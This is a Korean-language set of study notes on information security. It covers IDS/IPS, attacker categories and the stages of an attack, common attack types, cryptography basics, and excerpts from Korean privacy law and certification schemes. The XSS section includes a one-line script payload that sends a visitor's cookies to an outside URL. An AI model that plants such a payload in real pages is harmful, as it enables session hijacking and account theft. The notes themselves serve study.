# 정보보안

## 4차 산업
- 1차 산업
- 2차 산업
- 3차 산업
- 4차 산업

## 정보보안 범주
### 보안의분류
### 전산
- 히스토리
- 컴퓨터의 구조(하드웨어 분석)
  - 표현,단위
  - 연산
  - 함수
- 빅데이터
- 클라우드
- IOT
- mobile
### 정보보안
- 정규표현식
- 암호화
  - 단방향 암호화
    - 해쉬
  - 양방향 암호화
    - 대칭키 암호화
    - 공개키(비대칭키) 암호화
-동향

## 네트워크
- ISP(인터넷 접속 서비스를 제공하는 업체)와 공유기
- 침입탐지시스템 (IDS)(Intrusion Detection System)-이상징후경고,방화벽과의 연동 방어를 통해 차단 가능함(독립적 차단 제한적)
  - HIDS : Host based IDS
    - 특정 호스트시스템에서 수집된 감사자료를 분석하고 비정상 행위를 탐지
    - 특징
      - 탐지가 정확하다. NIDS와 다르게 모두 복호화된 데이터를 분석하고 패킷의 손실도 없다.
      - 추가적인 장비가 필요하지 않다.
      - 운영체제에 종속적이다. (리눅스 전용 IDS면 윈도우 서버에선 못 쓴다.)
      - 시스템에 부하가 발생한다.
      - 구현이 어렵다.

  - NIDS : Network based IDS
    - 네트워크를 바라보고 설치된다.
    - IDS장비를 네트워크 앞단에 설치하여 두고 네트워크에서 오가는 트래픽들을 분석한다.
    - 특징
      - 네트워크 전체를 몇개의 감지기를 통해 커버하므로 비용이 저렴하다.
      - 운영체제에 독립적이다.
      - 흘러가는 트래픽을 수집하여 분석하므로 해커가 임의로 지우기 어렵다.
      - 암호화된 트래픽은 분석이 불가능하다.
      - 고속 네트워크에선 패킷 손실이 많다.
      - 호스트 내부에서 벌어지는 비정상적인 행위에 대해선 감지가 불가능하다.

- 침입방지시스템 (IPS)(Intrusion Prevention System) 
  - 침입 탐지 시스템(IDS)와 방화벽을 결합하여 침입 행위를 탐지할 뿐만 아니라 침입 행위와 관련된 패킷과 연결을 차단

## 기초해킹
### 사이버 공격의 목적
- 상태 점검
- 역량 과시
- 이익 추구
- 경쟁상대 무력화
### 사이버 공격 분류
- 소속에 의한 분류 : 내부 공격자, 외부 공격자
- 공격 유형에 의한 분류 : 능동적 공격자, 수동적 공격자
- 공격 역량에 의한 분류
  - 엘리트(elite) : 새로운 취약점 찾기(O), 프로그램 개발능력(O)
  - 세미 엘리트(Semi Elite) : 새로운 취약점 찾기(X), 프로그램 개발능력(O)
  - 디벨롭트 키디(Developed Kiddie) : 새로운 취약점 찾기(X), 프로그램 개발능력(X), 활용능력(O)
  - 스크립트 키디(Script Kiddie) : 무작위
  - 레이머(Lamer) : 스타터
- 프로그래밍 능력에 의한 분류
  - 위저드(Wizard) : 작성
  - 구루(Guru) : 수정
  - 스크립트 키디 (Script Kiddie) : 단순 이용
- 공격 목적에 의한 분류
  - 화이트 해커(White Hat Hacker)
  - 해커(Back Hat Hacker)
- 사이버 공격 과정
    1. 준비 단계 - 목표선정, 분석 (풋프린팅(Foot Printing), 스캐닝(Scanning), 목록화(Enumeration), 사회공학공격 등)
    2. 접근 단계 - 접근 권한으로 시스템을 접근(관리자 계정 로그인, 프로그램 주입, 백도어 이용)
    3. 사용 단계
    4. 유지 단계 - 추후 지속적인 공격을 가능하게 하기 위해 시스템 접근을 유지(백도어 설치, 루트 키트 트로이 목마 설치) 
    5. 흔적 가리기(Cover The Track)-추적을 피하기 위해 공격의 흔적을 지움(로그 파일 수정, 삭제 등)
### 용어
- 백도어(Backdoor) :특정 목적을 위해 인증 과정 없이 시스템에 접속할 있게 만든 특수한 관리자 계정
- 루트키트(Rootkit) :위장되어 숨겨져 관리자 권한으로 동작하는 공격 프로그램
- 스파이웨어(spyware) :시스템에 몰래 설치되어 민감한 정보를 수집하여 공격자에게 전송하는 소프트웨어
- 풋프린팅 기법
  - 쓰레기통 뒤지기(Dumpster Driving)
  -  웹 사이트 조사
  -  관련 문서 조사
  -  폐기 컴퓨터 조사
  -  내부자 인터뷰
  -  내부 연락망 확보
  -  위장 잠입
  -  검색 엔진 이용
  -  whois 도구 이용
  -  도메인 주소 조회
  -  내부자와의 공모
  -  개인 정보 불법거래 업체 활용 등
- 스캐닝 : NMAP, Nessus와 같은 도구 사용
- 사회공학공격
  - 행동패턴을 통한 사회공학공격
  - ICT기반의 사회공학공격
    - 피싱(phishing) - 미끼
    - 파밍(pharming) - 위조사이트
- 가로채기 공격
  - 키 로깅(Key Logging)
  - 트래픽 스니핑(Traffic Sniffing) - 패킷분석
- Malware Attack
  - 바이러스(Virus)
  - 웜(Worm)
    - 제로데이 공격(Zero Day Attack) :운영체제나 소프트웨어의 패치가 개발되기 전의 취약점을 이용하는 공격
  - 트로이 목마(Trojan Horse)
- 스푸핑 공격
  - ARP Spoofing
  - IP Spoofing(세션하이제킹)
  - DNS Spoofing
- 소프트웨어 취약점 공격
  - Stack Buffer OverflowAttack
  - Heap Buffer Overflow Attack
  - Command Injection Attack
  - SQL Injection Attack
- XSS-Cross Site Scripting Attack
  ``` html
   <script>document.location=’http://www.naver.com/app?cookie=’+document.cookie;</script>
  ```
- 서비스 거부공격
  - 서비스거부(DoS)
    - Ping of Death Attack : 65535byte 이상의 패킷 전송
    - Teardrop Attack : 중복 IP Fragment
    - Land Attack : 출발지와 도착지 정보 일치
  - [분산서비스거부(DDoS) 공격종류](https://www.fortinet.com/kr/resources/cyberglossary/dos-vs-ddos)
  - Smurf DoS : 출발지가 목표시스템인 ping을 브로드 케스트로 전송
  - 랜섬웨어(ransomeware) :감염된 컴퓨터 시스템의 접근을 차단,금액을 지불하도록 요구

## 정보보안
### 정보 보안 목표
  - 기밀성, 무결성, 가용성, 인증성, 책임성
### 정보보안대책
  - 암호화 기술(Encryption Technology)
  - 해시 함수

## 암호화
- 암호화 기술 : [치환](https://m.blog.naver.com/koromoon/220569113249)&전치, XOR
- [참고](https://namu.wiki/w/%EC%95%94%ED%98%B8%ED%95%99?from=%EC%95%94%ED%98%B8%20%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98)
### 단방향 암호화
### 양방향 암호화
    - 대칭키 암호화
    - 공개키(비대칭키) 암호화

## 정보 보안 관련 법
- 정보통신망 이용촉진 및 정보보호 등에 관한 법률
- 개인정보 보호법
- 전자서명법
- 정보통신기반 보호법
- 위치정보의 보호 및 이용 등에 관한 법률

### 걔인정보 보호법
#### 제3조(개인정보 보호 원칙)
1. 개인정보처리자는 개인정보의 처리 목적을 명확하게 하여야 하고 그 목적에 필요한 범위에서 최소한의 개인정보만을 적법하고 정당하게 수집하여야 한다.
2. 개인정보처리자는 개인정보의 처리 목적에 필요한 범위에서 적합하게 개인정보를 처리하여야 하며, 그 목적 외의 용도로 활용하여서는 아니 된다.
3. 개인정보처리자는 개인정보의 처리 목적에 필요한 범위에서 개인정보의 정확성, 완전성 및 최신성이 보장되도록 하여야 한다.
4. 개인정보처리자는 개인정보의 처리 방법 및 종류 등에 따라 정보주체의 권리가 침해받을 가능성과 그 위험 정도를 고려하여 개인정보를 안전하게 관리하여야 한다.
5. 개인정보처리자는 개인정보 처리방침 등 개인정보의 처리에 관한 사항을 공개하여야하며, 열람청구권 등 정보주체의 권리를 보장하여야 한다.
6. 개인정보처리자는 정보주체의 사생활 침해를 최소화하는 방법으로 개인정보를 처리하여야 한다.
7. 개인정보처리자는 개인정보의 익명처리가 가능한 경우에는 익명에 의하여 처리될 수 있도록 하여야 한다.
8. 개인정보처리자는 이 법 및 관계 법령에서 규정하고 있는 책임과 의무를 준수하고 실천함으로써 정보주체의 신뢰를 얻기 위하여 노력하여야 한다.
#### 제4조(정보주체의 권리)
1. 개인정보의 처리에 관한 정보를 제공받을 권리
2. 개인정보의 처리에 관한 동의 여부, 동의 범위 등을 선택하고 결정할 권리
3. 개인정보의 처리 여부를 확인하고 개인정보에 대하여 열람(사본의 발급을 포함한다. 이하 같다)을 요구할 권리
4. 개인정보의 처리 정지, 정정ㆍ삭제 및 파기를 요구할 권리
5. 개인정보의 처리로 인하여 발생한 피해를 신속하고 공정한 절차에 따라 구제받을 권리
#### 제9조(기본계획)
1. 개인정보의 보호와 정보주체의 권익 보장을 위하여 행정자치부장관
은 3년마다 개인정보 보호 기본계획(이하 "기본계획"이라 한다)을 작
성하여 시행한다.
2. 기본계획에는 다음 각 호의 사항이 포함되어야 한다.
    1. 개인정보 보호의 기본목표와 추진방향
    2. 개인정보 보호와 관련된 제도 및 법령의 개선
    3. 개인정보 침해 방지를 위한 대책
    4. 개인정보 보호 자율규제의 활성화
    5. 개인정보 보호 교육ㆍ홍보의 활성화
    6. 개인정보 보호를 위한 전문인력의 양성
    7. 그 밖에 개인정보 보호를 위하여 필요한 사항
#### 제15조(개인정보의 수집ㆍ이용)
1. 개인정보처리자는 다음 각 호의 어느 하나에 해당하는 경우에는 개인
정보를 수집할 수 있으며 그 수집 목적의 범위에서 이용할 수 있다.
    1. 정보주체의 동의를 받은 경우
    2. 법률에 특별한 규정이 있거나 법령상 의무를 준수하기 위하여 불가피한 경우
    3. 공공기관이 법령 등에서 정하는 소관 업무의 수행을 위하여 불가피한 경우
    4. 정보주체와의 계약의 체결 및 이행을 위하여 불가피하게 필요한 경우
    5. 정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 주소불명 등으로 사전 동의를 받을 수 없는 경우로서 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요하다고 인정되는 경우
    6. 개인정보처리자의 정당한 이익을 달성하기 위하여 필요한 경우로서 명백하게 정보주체의 권리보다 우선하는 경우. 이 경우 개인정보처리자의 정당한 이익과 상당한 관련이 있고 합리적인 범위를 초과하지 아니하는 경우에 한한다.
2. 개인정보처리자는 제1항제1호에 따른 동의를 받을 때에는 다음 각 호의 사항을 정보주체에게 알려야 한다. 다음 각호의 어느 하나의 사항을 변경하는 경우에도 이를 알리고 동의를 받아야 한다.
    1. 개인정보의 수집ㆍ이용 목적
    2. 수집하려는 개인정보의 항목
    3. 개인정보의 보유 및 이용 기간
    4. 동의를 거부할 권리가 있다는 사실 및 동의 거부에 따른 불이익이 있는 경우에는 그 불이익의 내용
#### 제16조(개인정보의 수집 제한)
1. 개인정보처리자는 제15조제1항 각 호의 어느 하나에 해당하여 개인정보를 수집하는 경우에는 그 목적에 필요한 최소한의 개인정보
를 수집하여야 한다. 이 경우 최소한의 개인정보 수집이라는 입증책임은 개인정보처리자가 부담한다.
2. 개인정보처리자는 정보주체의 동의를 받아 개인정보를 수집하는 경우 필요한 최소한의 정보 외의 개인정보 수집에는 동의하지 아니할
수 있다는 사실을 구체적으로 알리고 개인정보를 수집하여야 한다.<신설 2013.8.6.>
3. 개인정보처리자는 정보주체가 필요한 최소한의 정보 외의 개인정보수집에 동의하지 아니한다는 이유로 정보주체에게 재화 또는 서비
스의 제공을 거부하여서는 아니 된다. <개정 2013.8.6.>
#### 제17조(개인정보의 제공)
2. 개인정보처리자는 제1항제1호에 따른 동의를 받을 때에는 다음 각 호의 사항을 정보주체에게 알려야 한다. 다음 각호의 어느 하나의 사항을 변경하는 경우에도 이를 알리고 동의를 받아야 한다.
    1. 개인정보를 제공받는 자
    2. 개인정보를 제공받는 자의 개인정보 이용 목적
    3. 제공하는 개인정보의 항목
    4. 개인정보를 제공받는 자의 개인정보 보유 및 이용 기간
    5. 동의를 거부할 권리가 있다는 사실 및 동의 거부에 따른 불이익이 있는 경우에는 그 불이익의 내용
#### 제18조(개인정보의 목적 외 이용ㆍ제공 제한)
2. 다음 각 호의 어느 하나에 해당하는 경우에는 정보주체 또는 제3자의 이익을 부당하게 침해할 우려가 있을 때를 제외하고는 개인정보를 목적 외의 용도로 이용하거나 이를 제3자에게제공할 수 있다. 다만, 제5호부터 제9호까지의 경우는 공공기관의 경우로 한정한다.
    1. 정보주체로부터 별도의 동의를 받은 경우
    2. 다른 법률에 특별한 규정이 있는 경우
    3. 정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 주소불명 등으로 사전 동의를 받을 수 없는 경우로서 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요하다고 인정되는 경우
    4. 통계작성 및 학술연구 등의 목적을 위하여 필요한 경우로서 특정 개인을 알아볼 수 없는 형태로 개인정보를 제공하는 경우
    5. 개인정보를 목적 외의 용도로 이용하거나 이를 제3자에게 제공하지 아니하면 다른 법률에서 정하는 소관 업무를 수행할 수 없는 경우로서 보호위원회의 심의ㆍ의결을 거친 경우
    6. 조약, 그 밖의 국제협정의 이행을 위하여 외국정부 또는 국제기구에 제공하기 위하여 필요한 경우
    7. 범죄의 수사와 공소의 제기 및 유지를 위하여 필요한 경우
    8. 법원의 재판업무 수행을 위하여 필요한 경우
    9. 형(刑) 및 감호, 보호처분의 집행을 위하여 필요한 경우
#### 제20조(정보주체 이외로부터 수집한 개인정보의 수집 출처 등 고지)
1. 개인정보처리자가 정보주체 이외로부터 수집한 개인정보를 처리하는 때에는 정보주체의 요구가 있으면 즉시 다음 각호의 모든 사항을 정보주체에게 알려야 한다.
    1. 개인정보의 수집 출처
    2. 개인정보의 처리 목적
    3. 제37조에 따른 개인정보 처리의 정지를 요구할 권리가 있다는 사실
#### 제22조(동의를 받는 방법)
1. 개인정보처리자는 이 법에 따른 개인정보의 처리에 대하여 정보주체(제5항에 따른 법정대리인을 포함한다. 이하 이 조에서 같다)의 동의를 받을 때에는 각각의 동의 사항을 구분하여 정보주체가 이를 명확하게 인지할 수 있도록 알리고 각각 동의를 받아야 한다.
2. 개인정보처리자는 제15조제1항제1호, 제17조제1항제1호, 제23조제1호 및 제24조제1항제1호에 따라 개인정보의 처리에 대하여 정보주체의 동의를 받을 때에는 정보주체와의 계약 체결 등을 위하여 정보주체의 동의 없이 처리할 수 있는 개인정보와
정보주체의 동의가 필요한 개인정보를 구분하여야 한다. 이 경우 동의 없이 처리할 수 있는 개인정보라는 입증책임은 개인정보처리자가 부담한다.
3. 개인정보처리자는 정보주체에게 재화나 서비스를 홍보하거나 판매를 권유하기 위하여 개인정보의 처리에 대한 동의를 받으려는 때에는 정보주체가 이를 명확하게 인지할 수 있도록 알리고 동의를 받아야 한다.
4. 개인정보처리자는 정보주체가 제2항에 따라 선택적으로 동의할 수 있는 사항을 동의하지 아니하거나 제3항 및 제18조제2항제1호에 따른 동의를 하지 아니한다는 이유로 정보주체에게 재화 또는 서비스의 제공을 거부하여서는 아니 된다.
5. 개인정보처리자는 만 14세 미만 아동의 개인정보를 처리하기 위하여 이 법에 따른 동의를 받아야 할 때에는 그 법정대리인의 동의를 받아야 한다. 이 경우 법정대리인의 동의를 받기 위하여 필요한 최소한의 정보는 법정대리인의 동의 없이 해당 아동으로부터 직접 수집할 수 있다.
#### 제23조(민감정보의 처리 제한)
개인정보처리자는 사상ㆍ신념, 노동조합ㆍ정당의 가입ㆍ탈퇴, 정치적 견해, 건강, 성생활 등에 관한 정보, 그 밖에 정
보주체의 사생활을 현저히 침해할 우려가 있는 개인정보로서 대통령령으로 정하는 정보(이하 "민감정보"라 한다)를
처리하여서는 아니 된다. 다만, 다음 각 호의 어느 하나에 해당하는 경우에는 그러하지 아니하다.
  1. 정보주체에게 제15조제2항 각 호 또는 제17조제2항 각 호의 사항을 알리고 다른 개인정보의 처리에 대한 동의와 별도로 동의를 받은 경우
  2. 법령에서 민감정보의 처리를 요구하거나 허용하는 경우
#### 제24조의2(주민등록번호 처리의 제한)
1. 제24조제1항에도 불구하고 개인정보처리자는 다음 각 호의 어느 하나에 해당하는 경우를 제외하고는 주민등록번호를 처리할 수 없다.
    1. 법령에서 구체적으로 주민등록번호의 처리를 요구하거나 허용한 경우
    2. 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 명백히 필요하다고 인정되는 경우
    3. 제1호 및 제2호에 준하여 주민등록번호 처리가 불가피한 경우로서 안전행정부령으로 정하는 경우
2. 개인정보처리자는 제24조제3항에도 불구하고 주민등록번호가 분실ㆍ도난ㆍ유출ㆍ변조 또는 훼손되지 아니하도록 암호화 조치를 통하여 안전하게 보관하여야 한다. 이 경우 암호화 적용 대상 및 대상별 적용 시기 등에 관하여 필요한 사항은 개인정보의 처리 규모와 유출 시 영향 등을 고려하여 대통령령으로 정한다.<신설 2014.3.24.>
3. 개인정보처리자는 제1항 각 호에 따라 주민등록번호를 처리하는 경우에도 정보주체가 인터넷 홈페이지를 통하여 회원으로 가입하는 단계에서는 주민등록번호를 사용하지 아니하고도 회원으로 가입할 수 있는 방법을 제공하여야 한다.<개정 2014.3.24.>
#### 제25조(영상정보처리기기의 설치ㆍ운영 제한)
1. 누구든지 다음 각 호의 경우를 제외하고는 공개된 장소에 영상정보처리기기를 설치ㆍ운영하여서는 아니된다.
    1. 법령에서 구체적으로 허용하고 있는 경우
    2. 범죄의 예방 및 수사를 위하여 필요한 경우
    3. 시설안전 및 화재 예방을 위하여 필요한 경우
    4. 교통단속을 위하여 필요한 경우
    5. 교통정보의 수집ㆍ분석 및 제공을 위하여 필요한 경우
2. 누구든지 불특정 다수가 이용하는 목욕실, 화장실, 발한실(發汗室),탈의실 등 개인의 사생활을 현저히 침해할 우려가 있는 장소의 내부를 볼 수 있도록 영상정보처리기기를 설치ㆍ운영하여서는 아니 된다. 다만,교도소, 정신보건 시설 등 법령에 근거하여 사람을 구금하거나 보호하는 시설로서 대통령령으로 정하는 시설에 대하여는 그러하지 아니하다.
3. 제1항 각 호에 따라 영상정보처리기기를 설치ㆍ운영하려는 공공기관의 장과 제2항 단서에 따라 영상정보처리기기를 설치ㆍ운영하려는 자는 공청회ㆍ설명회의 개최 등 대통령령으로 정하는 절차를 거쳐 관계 전문가 및 이해관계인의 의견을 수렴하여야 한다.
4. 제1항 각 호에 따라 영상정보처리기기를 설치ㆍ운영하는 자(이하 "영상정보처리기기운영자"라 한다)는 정보주체가 쉽게 인식할 수 있도록 대통령령으로 정하는 바에 따라 안내판 설치 등 필요한 조치를 하여야 한다. 다만, 대통령령으로 정하는 시설에 대하여는 그러하지아니하다.
5. 영상정보처리기기운영자는 영상정보처리기기의 설치 목적과 다른 목적으로 영상정보처리기기를 임의로 조작하거나 다른 곳을 비춰서는 아니 되며, 녹음기능은 사용할 수 없다.
### 전자서명법
- 제3조(전자서명의 효력 등)
- 제15조(공인인증서의 발급)
- 제17조(공인인증서의 효력정지 등)
- 제18조의2(공인인증서를 이용한 본인확인)
### 정보통신망 이용촉진 및 정보보호등에 관한 법률
- 제27조의2(개인정보 취급방침의 공개)
- 제27조의3(개인정보 누출등의 통지·신고)
- 제28조(개인정보의 보호조치)
- 제30조(이용자의 권리 등)
- 제44조의7(불법정보의 유통금지 등)
- 제45조의3(정보보호 최고책임자의 지정 등)
- 제47조(정보보호 관리체계의 인증)
- 제50조(영리목적의 광고성 정보 전송 제한)
### 정보통신기반 보호법
- 제7조(주요정보통신기반시설의 보호지원)
- 제8조(주요정보통신기반시설의 지정 등)
- 제9조(취약점의 분석·평가)
- 제12조(주요정보통신기반시설 침해행위 등의 금지)
### 위치정보의 보호 및 이용 등에 관한 법률
- 제15조(위치정보의 수집 등의 금지)
- 제16조(위치정보의 보호조치 등)
- 제18조(개인위치정보의 수집)
- 제19조(개인위치정보의 이용 또는 제공)
- 제21조(개인위치정보 등의 이용ㆍ제공의 제한 등)
- 제29조(긴급구조를 위한 개인위치정보의 이용)




## 인증
### ISMS 인증
  - 정보통신망 이용촉진 및 정보보호 등에 관한 법률 제47조
  - 정보보호 관리체계 인증 등에 관한 고시 (미래창조과학부고시 제2013-36호)
  - 목적 : 기업(조직)이 각종 위협으로부터 주요 정보자산을 보호하기 위해 수립ㆍ관리ㆍ운영하는 종합적인 체계(정보보호 관리체계)의 적합성을 검증하고 이에 대해 인증을 부여
### PIMS 인증
  - 정보통신망 이용촉진 및 정보보호 등에 관한 법률
  - 방송통신위원회 고시 제2013-17호 “개인정보보호 관리체계 인증 등에 관한 고시”
  - 목적 : 기업이 개인정보 보호 활동을 체계적이고 지속적으로 수행하기 위해 필요한 보호조치 체계를 구축하였는지 점검하여 일정 수준 이상의 기업에 인증을 부여




## 참조
- webgoat
  - [도움](https://hackingisly.tistory.com/152)
